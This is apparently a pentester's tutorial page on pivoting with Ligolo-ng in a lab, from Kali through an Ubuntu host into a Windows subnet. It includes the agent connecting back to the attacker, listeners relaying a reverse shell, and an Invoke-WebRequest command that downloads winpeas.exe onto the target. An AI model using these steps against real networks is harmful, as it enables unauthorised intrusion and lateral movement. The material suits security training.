# Ligolo-ng

**Ligolo-ng** is a _simple_, _lightweight_ and _fast_ tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface** (without the need of SOCKS).

{% embed url="https://github.com/nicocha30/ligolo-ng" %}

## Setting Up

{% embed url="https://github.com/nicocha30/ligolo-ng/releases" %}

For the setup, we need only two files. Agent and Proxy

Agent: File to be installed on pivot machine\
Proxy: File to be installed on attacker machine

## Attack Scenario 1

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

For this first attack scenario, we have our attacker machine (kali) and pivot machine (ubuntu).\
Pivot machine has an additional network interface (172.16.1.15).\
We cannot ping/access this {172.16.1.15} network from our attacker machine (kali).

Lets get access to this network

In our attacker machine\
`sudo ip tuntap add user [your_username] mode tun ligolo`\
this will add new tun interface `ligolo`\
`sudo ip link set ligolo up`\
this will enable the newly created interface `ligolo`

Now we need two file\
`ligolo-ng_agent_version-linux_version.tar.gz` for pivot machine\
`ligolo-ng_proxy_version-linux_version.tar.gz`for attacker machine

get latest version form official github repo.

Then transfer the agent file to the pivot machine (ubuntu)

### In attacker machine

`./proxy -selfcert`

### In pivot machine

`./agent -connect kali_linux_ip:11601 -ignore-cert`\
port `11601` is by default set on proxy in the attacker machine\
we should use `-autocert` flag when the pivot machine has internet access. This is more secure than `-ignore-cert`

### In attacker machine

`session` to list the session and select the session we want to connect\
`ifconfig or ipconfig` to view the interface of the pivot machine.

Now in new terminal\
sudo ip route add `172.16.1.0/24 dev ligolo`\
here we are adding route for 172.16.1.0/24 network

once the route is set.

Go back to the terminal where agent is agent is running\
`start` -> this wll start tunnel to the pivot machine.

Now we have connection to the `172.16.1.0/24`network\
Meaning we can view the webserver running on port 80 of windows `172.16.1.16`

## Getting Reverse Shell

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Lets say we now have access to the windows machine on `172.16.1.0/24` which was previously not routable from our attacker host. Now we want reverse shell connection from that machine (windows).

That windows machine cannot reach us, it does not have route to our ip, it can only reach the pivot machine.

To solve this

We can listen to ports on Agent (pivot machine) and redirect the connection back to us (attacker machine)

we can set this up using

*   In attacker proxy terminal\
    `listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp`

    on the pivot machine, any device or interface on port `30000` will redirect our port `10000`

Which means we can create a payload with\
lhost: 172.16.1.15\
lport: 10000

when the pivot machine gets data on port 30000\
it will redirecto it to port 10000 on our attacker machine(kali)\\

Meaning we can listen on 10000 to get the reverse shell connection.

## Transferring File Between Machines

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To transfer files, we can add another listener.

`listener_add --addr 0.0.0.0:11111 --to 127.0.0.1:22222 --tcp`

In our attacker machine run python http server on port 22222

In windows target machine, download the file using

`Invoke-WebRequest -Uri "http://172.16.1.15:11111/winpeas.exe" -OutFile winpeas.exe`

Here, windows will send request to port 11111 on pivot (ubuntu) and ligolo-ng will redirect it to port 22222 on our attacker machine\
\
\
For more insight, watch this video by John Hammond

{% embed url="https://youtu.be/qou7shRlX_s" %}
